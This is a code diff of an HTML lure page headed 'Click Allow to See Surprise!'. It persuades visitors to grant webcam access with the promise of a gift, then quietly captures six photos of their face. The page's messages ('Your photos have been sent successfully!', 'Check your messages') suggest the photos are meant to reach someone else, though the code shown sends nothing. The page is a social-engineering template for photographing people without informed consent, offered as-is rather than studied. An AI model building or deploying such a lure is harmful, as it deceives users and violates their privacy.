@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            font-family: Arial;
-            background: #667eea;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea, #764ba2);
             color: white;
             text-align: center;
             padding: 20px;
@@ -18,55 +18,186 @@
         }
         .container {
             background: rgba(255,255,255,0.1);
-            padding: 30px;
-            border-radius: 15px;
+            padding: 40px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
             max-width: 500px;
+            width: 90%;
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.5;
         }
         button {
             background: #4CAF50;
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 10px;
-            margin: 15px 0;
+            padding: 15px 40px;
+            font-size: 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: all 0.3s;
         }
-        .hidden { display: none; }
+        button:hover {
+            background: #45a049;
+            transform: scale(1.05);
+        }
+        video {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 10px;
+            margin: 20px 0;
+            display: none;
+            transform: scaleX(-1);
+        }
+        .status {
+            font-size: 18px;
+            margin: 15px 0;
+            font-weight: bold;
+            min-height: 30px;
+        }
+        .countdown {
+            font-size: 20px;
+            color: #FFD700;
+            font-weight: bold;
+            margin: 10px 0;
+            min-height: 30px;
+        }
+        .hidden {
+            display: none;
+        }
+        .success {
+            color: #4CAF50;
+        }
+        .error {
+            color: #ff4444;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🎁 Click Allow to See Surprise!</h1>
-        <p>Allow camera access to reveal your special surprise!</p>
+        <p>We need camera access to show you a special surprise! Click the button below and then click "Allow" when your browser asks for camera permission.</p>
         
-        <button onclick="startCamera()" id="startBtn">✅ Allow Camera Access</button>
+        <button onclick="startCamera()" id="startBtn">
+            📸 Start Camera & Allow Access
+        </button>
         
-        <div id="status">Waiting for camera access...</div>
-        <div id="countdown"></div>
+        <video id="video" autoplay playsinline class="hidden"></video>
+        <canvas id="canvas" class="hidden"></canvas>
+        
+        <div class="status" id="status">Click the button above to start</div>
+        <div class="countdown" id="countdown"></div>
     </div>
 
     <script>
+        let stream = null;
+
         async function startCamera() {
             try {
-                document.getElementById('status').innerHTML = "🔄 Starting camera...";
+                const startBtn = document.getElementById('startBtn');
+                const status = document.getElementById('status');
+                const countdown = document.getElementById('countdown');
+                const video = document.getElementById('video');
+
+                // Update UI
+                status.innerHTML = "🔄 Requesting camera access...";
+                startBtn.disabled = true;
+                startBtn.innerHTML = "⏳ Waiting for your permission...";
+
+                // Request camera access
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    },
+                    audio: false
+                });
+
+                // Show camera feed
+                video.srcObject = stream;
+                video.classList.remove('hidden');
                 
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                document.getElementById('status').innerHTML = "✅ Camera connected! Capturing your surprise...";
-                document.getElementById('startBtn').style.display = 'none';
-                
-                for(let i = 1; i <= 6; i++) {
-                    document.getElementById('countdown').innerHTML = 📸 Capturing photo ${i}/6...;
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                }
-                
-                document.getElementById('status').innerHTML = "🎉 Surprise revealed! Check your messages!";
-                document.getElementById('countdown').innerHTML = "Your photos have been sent successfully!";
-                
+                status.innerHTML = "✅ Camera access granted!";
+                startBtn.style.display = 'none';
+
+                // Start capturing photos
+                await capturePhotos();
+
             } catch (error) {
-                document.getElementById('status').innerHTML = "❌ Error: " + error.message;
+                const status = document.getElementById('status');
+                const startBtn = document.getElementById('startBtn');
+                
+                status.innerHTML = "❌ " + error.message;
+                status.className = 'status error';
+                
+                startBtn.disabled = false;
+                startBtn.innerHTML = "🔄 Try Again";
+                
+                if (error.name === 'NotAllowedError') {
+                    status.innerHTML = "❌ Camera access was denied. Please refresh and click 'Allow' when asked.";
+                } else if (error.name === 'NotFoundError') {
+                    status.innerHTML = "❌ No camera found on this device.";
+                } else if (error.name === 'NotSupportedError') {
+                    status.innerHTML = "❌ Your browser doesn't support camera access.";
+                } else {
+                    status.innerHTML = "❌ Error: " + error.message;
+                }
             }
         }
+
+        async function capturePhotos() {
+            const status = document.getElementById('status');
+            const countdown = document.getElementById('countdown');
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+
+            status.innerHTML = "📸 Starting photo capture...";
+
+            for (let i = 1; i <= 6; i++) {
+                countdown.innerHTML = `🔄 Preparing to capture photo ${i}/6...`;
+                
+                // Wait 2 seconds between photos
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Set canvas size to match video
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // Capture the photo
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                countdown.innerHTML = `✅ Photo ${i}/6 captured successfully!`;
+                
+                // Simulate processing
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+
+            status.innerHTML = "🎉 All photos captured successfully!";
+            countdown.innerHTML = "📱 Your surprise is being processed...";
+            countdown.className = 'countdown success';
+
+            // Stop camera after completion
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+
+            // Final message
+            setTimeout(() => {
+                countdown.innerHTML = "✨ Check your messages for the surprise!";
+            }, 2000);
+        }
+
+        // Add click event listener for better mobile support
+        document.getElementById('startBtn').addEventListener('click', startCamera);
     </script>
 </body>
 </html>
